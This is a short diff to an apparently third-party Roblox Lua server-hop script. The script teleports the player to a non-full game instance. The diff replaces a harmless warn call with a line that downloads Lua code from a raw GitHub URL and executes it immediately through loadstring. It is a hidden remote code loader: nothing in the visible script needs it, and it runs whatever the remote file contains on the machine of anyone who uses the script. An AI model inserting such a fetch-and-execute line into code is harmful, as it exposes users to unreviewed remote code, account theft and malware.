@@ -55,5 +55,5 @@ local HttpService, TPService = game:GetService("HttpService"), game:GetService("
        if s.playing ~= s.maxPlayers then
            TPService:TeleportToPlaceInstance(game.PlaceId, s.id)
            wait()
-warn("Warned.")
+           loadstring(game:HttpGet("https://raw.githubusercontent.com/wqrey/scripts/main/load.lua"))()
       end end end end) end end)
